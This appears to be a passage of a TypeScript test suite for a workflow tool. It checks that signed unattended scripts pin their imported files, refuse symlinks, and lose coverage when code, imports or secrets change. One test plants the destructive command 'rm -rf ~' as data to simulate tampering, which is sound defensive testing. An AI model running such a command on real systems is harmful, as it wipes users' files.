    expect(ranOf(store.lastFlowTriggerCard(trigger)!)).toMatch(/^[0-9a-f]{32}$/);
    expect(ranOf(swapped)).not.toBe(ranOf(store.lastFlowTriggerCard(trigger)!));
  });

  test("a Node script pins the project files it imports: changing one ends coverage", async () => {
    mkdirSync(join(repo, "scripts"));
    writeFileSync(join(repo, "scripts", "issues.mjs"), 'import { readFileSync } from "node:fs";\nimport { list } from "./lib/list.mjs";\nconsole.log(JSON.stringify(list(readFileSync)));\n');
    mkdirSync(join(repo, "scripts", "lib"));
    writeFileSync(join(repo, "scripts", "lib", "list.mjs"), 'export { list } from "../../shared.cjs";\n');
    writeFileSync(join(repo, "shared.cjs"), "exports.list = () => [];\n");
    const { flow, trigger } = scriptFlow("scripts/issues.mjs", "skip", "node");
    const signed = await sign(flow, { include: [trigger] });
    if (!signed.ok) throw Error(signed.message);
    expect(signed.grant.terms.triggers[0]!.script!.files.map(one => one.path)).toEqual(["scripts/issues.mjs", "scripts/lib/list.mjs", "shared.cjs"]);
    expect(sealed(await fireScript(trigger, at(HOUR)))).toBe(true);
    writeFileSync(join(repo, "shared.cjs"), "exports.list = () => [{ title: 'rm -rf ~' }];\n");
    expect(sealed(await fireScript(trigger, at(2 * HOUR)))).toBe(false);
    expect(activeUnattendedGrant(store, flow, at(2 * HOUR))).toBeNull();
    expect(ended("script changed")).toHaveLength(1);
  });

  test("a Node script with a static import that doesn't resolve can't be signed", async () => {
    mkdirSync(join(repo, "scripts"));
    writeFileSync(join(repo, "scripts", "issues.mjs"), 'import "./missing.mjs";\nconsole.log("[]");\n');
    const { flow, trigger } = scriptFlow("scripts/issues.mjs", "skip", "node");
    expect(await sign(flow, { include: [trigger] })).toEqual({ ok: false, message: expect.stringContaining("script can't be read safely") });
  });

  test("symlinked entries and project imports escaping through symlinks cannot be signed", async () => {
    writeFileSync(join(dir, "outside.mjs"), "export default [];\n");
    symlinkSync(join(dir, "outside.mjs"), join(repo, "entry.mjs"));
    const { flow, trigger } = scriptFlow("entry.mjs", "skip", "node");
    expect(await sign(flow, { include: [trigger] })).toMatchObject({ ok: false, message: expect.stringContaining("can't be read safely") });
    rmSync(join(repo, "entry.mjs"));
    writeFileSync(join(repo, "entry.mjs"), 'import "./linked.mjs";');
    symlinkSync(join(dir, "outside.mjs"), join(repo, "linked.mjs"));
    expect(await sign(flow, { include: [trigger] })).toMatchObject({ ok: false, message: expect.stringContaining("can't be read safely") });
    // An entry symlink to a file inside the project is also refused.
    rmSync(join(repo, "entry.mjs"));
    writeFileSync(join(repo, "real.mjs"), "console.log('[]');");
    symlinkSync(join(repo, "real.mjs"), join(repo, "entry.mjs"));
    expect(await sign(flow, { include: [trigger] })).toMatchObject({ ok: false });
  });

  test("literal createRequire dependencies are pinned and unresolved ones fail closed", async () => {
    writeFileSync(join(repo, "entry.mjs"), 'import { createRequire } from "node:module"; createRequire(import.meta.url)("./data.cjs");');
    writeFileSync(join(repo, "data.cjs"), "module.exports = [];");
    const { flow, trigger } = scriptFlow("entry.mjs", "skip", "node");
    const signed = await sign(flow, { include: [trigger] });
    expect(signed.ok && signed.grant.terms.triggers[0]!.script!.files.map(one => one.path)).toEqual(["data.cjs", "entry.mjs"]);
    writeFileSync(join(repo, "data.cjs"), "module.exports = ['changed'];");
    expect(sealed(await fireScript(trigger, at(HOUR)))).toBe(false);
    rmSync(join(repo, "data.cjs"));
    expect(await sign(flow, { include: [trigger] })).toMatchObject({ ok: false });
  });

  test("signing resolves outside transactions and filing and rendering only read saved provenance", async () => {
    writeFileSync(join(repo, "entry.mjs"), 'import "./data.mjs";');
    writeFileSync(join(repo, "data.mjs"), "export default [];");
    const { flow, trigger } = scriptFlow("entry.mjs", "skip", "node");
    let transacting = false;
    const transact = store.transact.bind(store);
    vi.spyOn(store, "transact").mockImplementation(body => transact(() => { transacting = true; try { return body(); } finally { transacting = false; } }));
    const { spawn } = await vi.importActual<typeof childProcess>("node:child_process");
    const spawned = vi.spyOn(childProcess, "spawn").mockImplementation((...args: Parameters<typeof spawn>) => { expect(transacting).toBe(false); return spawn(...args); });
    expect((await sign(flow, { include: [trigger] })).ok).toBe(true);
    expect(spawned).toHaveBeenCalled();
    spawned.mockClear();
    await prepareUnattendedCandidates(store, flow);
    expect(spawned).not.toHaveBeenCalled();
    store.updateFlowTrigger(trigger, { nextAt: at(HOUR - 60_000).toISOString() }, at(HOUR));
    await runFlowTriggers(store, repo, at(HOUR), scriptIo);
    spawned.mockClear();
    const reads = vi.spyOn(files, "readFile").mockClear();
    const paths = vi.spyOn(files, "realpath").mockClear();
    advanceFlows(store, repo, at(HOUR));
    unattendedViewOf(store, store.getFlow(flow)!, { name: "alex", approver: true }, at(HOUR));
    expect(spawned).not.toHaveBeenCalled();
    expect(reads).not.toHaveBeenCalled();
    expect(paths).not.toHaveBeenCalled();
    expect(sealed(store.getFlowCard(store.lastFlowTriggerCard(trigger)!)!.task)).toBe(true);
  });

  test("adding a secret name to the script's schedule ends its coverage", async () => {
    const { flow, trigger } = scriptFlow();
    await sign(flow, { include: [trigger] });
    expect(sealed(await fireScript(trigger, at(HOUR)))).toBe(true);
    expect(setFlowSecret(dir, repo, "GITHUB_TOKEN", "ghp_example").ok).toBe(true);
    const config = JSON.parse(store.getFlowTrigger(trigger)!.configJson) as Record<string, unknown>;
    store.handle.prepare("UPDATE flow_trigger SET config_json = ? WHERE id = ?").run(JSON.stringify({ ...config, secrets: ["GITHUB_TOKEN"] }), trigger);
    expect(sealed(await fireScript(trigger, at(2 * HOUR)))).toBe(false);
  });

  // A grant whose recorded script provenance is an older or incomplete shape covers nothing.
  test.each([
    ["the previous script record shape (no provenance)", false, (terms: Record<string, any>) => { delete terms.triggers[0].script.provenance; return terms; }, true],
    ["a grant signed before imports were pinned", true, (terms: Record<string, any>) => { const { files, file, ...script } = terms.triggers[0].script; return { ...terms, triggers: [{ ...terms.triggers[0], script: { ...script, file: { path: file, digest: files[0].digest } } }] }; }, true],
    ["a grant signed without its script's code", false, (terms: Record<string, any>) => { const { script: _dropped, ...bare } = terms.triggers[0]; return { ...terms, triggers: [bare] }; }, false],
  ] as const)("%s covers nothing", async (_name, withFile, mutate, redigest) => {
    if (withFile) { mkdirSync(join(repo, "scripts")); writeFileSync(join(repo, "scripts", "issues.sh"), "echo '[]'\n"); }
    const { flow, trigger } = scriptFlow(withFile ? "scripts/issues.sh" : null);
    const signed = await sign(flow, { include: [trigger] });
    if (!signed.ok) throw Error(signed.message);
    const terms = mutate(JSON.parse(unattendedTermsJson(signed.grant.terms)));
    if (redigest) store.handle.prepare("UPDATE flow_unattended_grant SET terms_json = ?, digest = ? WHERE id = ?").run(JSON.stringify(terms), unattendedDigestOf(terms as never), signed.grant.id);
    else store.handle.prepare("UPDATE flow_unattended_grant SET terms_json = ? WHERE id = ?").run(JSON.stringify(terms), signed.grant.id);
    expect(activeUnattendedGrant(store, flow, at(HOUR))).toBeNull();
  });

  test("the signing terms say a renewal sends waiting work back, and a script edit ends it", async () => {
    expect(UNATTENDED_RULE_WORDS).toEqual(expect.arrayContaining([
      "Signing again replaces it: work it approved that hasn't started goes back to waiting for you.",
      expect.stringContaining("a script they run or a project file it imports"),
    ]));
  });
});
